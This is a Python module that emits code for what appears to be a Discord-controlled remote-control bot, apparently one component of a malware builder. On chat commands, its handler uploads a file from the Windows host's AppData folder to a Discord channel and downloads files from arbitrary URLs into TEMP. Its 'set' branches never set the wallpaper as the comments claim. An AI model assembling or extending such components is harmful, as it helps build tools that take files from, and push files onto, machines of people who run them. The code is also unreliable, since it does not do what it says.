# THIS COMPONENT WILL:
# set the given image to the wallpaper or extract it.
# the image is located at %AppData%\Microsoft\Windows\Themes\ under the name of TranscodedWallpaper with no extension.
# make it get the file, set the file as .jpeg and send it in chat.
# ----------------------
# TODO:
# -wallpaper get
# -wallpaper set -l <www.link.to/file.png>
# -wallpaper set -a (has attachment)

def get_dependencies():
    return """
import os
import shutil
import discord
import requests
"""

def get_code():
    return """

    elif message.content.lower() == "wallpaper get":
        path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Themes", "TranscodedWallpaper")
        shutil.copy(path, path + ".jpeg")
        file = discord.File(path + ".jpeg")
        await message.channel.send(file=file)
        os.remove(path + ".jpeg")
        await message.channel.send("```diff\\n+ Wallpaper\\n```")
    elif message.content.lower().startswith("wallpaper set -l"):
        url = message.content[17:]
        response = requests.get(url)
        path = os.path.join(os.getenv("TEMP"), "wallpaper.png")
        with open(path, "wb") as file:
            file.write(response.content)
        os.rename(path, path + ".jpeg")
        file = discord.File(path + ".jpeg")
        await message.channel.send(file=file)
        os.remove(path + ".jpeg")
        await message.channel.send("```diff\\n+ Wallpaper\\n```")
    elif message.content.lower() == "wallpaper set -a":
        path = os.path.join(os.getenv("TEMP"), "wallpaper.png")
        await message.attachments[0].save(path)
        os.rename(path, path + ".jpeg")
        file = discord.File(path + ".jpeg")
        await message.channel.send(file=file)
        os.remove(path + ".jpeg")
        await message.channel.send("```diff\\n+ Wallpaper\\n```")
        
"""
